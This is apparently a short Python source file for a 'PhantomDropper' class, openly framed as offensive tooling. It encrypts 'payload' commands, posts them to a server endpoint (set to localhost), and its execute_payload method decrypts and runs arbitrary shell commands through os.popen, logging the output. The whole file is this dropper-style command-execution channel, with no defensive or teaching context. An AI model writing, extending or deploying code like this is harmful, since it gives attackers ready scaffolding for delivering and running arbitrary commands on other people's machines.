import os, time, requests
from cryptography.fernet import Fernet

class PhantomDropper:
    def __init__(self, log_dir="logs", drop_id=None):
        os.makedirs(log_dir, exist_ok=True)
        self.log_file = os.path.join(log_dir, "results.log")
        self.drop_id = drop_id or f"DROP-{int(time.time())}"
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.remote_url = "http://localhost:8080/receive"
        self.log(f"[+] Dropper Initialized: {self.drop_id}")

    def encrypt(self, data):
        return self.cipher.encrypt(data.encode())

    def decrypt(self, token):
        return self.cipher.decrypt(token).decode()

    def log(self, msg):
        with open(self.log_file, "a", encoding="utf-8") as f:
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {msg}\n")
        print(msg)

    def send_to_server(self, encrypted_payload):
        try:
            r = requests.post(self.remote_url, json={"payload": encrypted_payload.decode()})
            self.log(f"[→] Sent to Server | Status: {r.status_code}")
        except Exception as e:
            self.log(f"[ERROR] Send Failed: {e}")

    def deploy_payload(self, payload_command):
        encrypted = self.encrypt(payload_command)
        self.log(f"[Payload Deployed] {payload_command}")
        self.send_to_server(encrypted)
        return encrypted

    def execute_payload(self, encrypted_payload):
        try:
            cmd = self.decrypt(encrypted_payload)
            self.log(f"[EXEC] {cmd}")
            result = os.popen(cmd).read().strip()
            self.log(f"[RESULT] {result}")
            return result
        except Exception as e:
            self.log(f"[ERROR] {str(e)}")
            return None
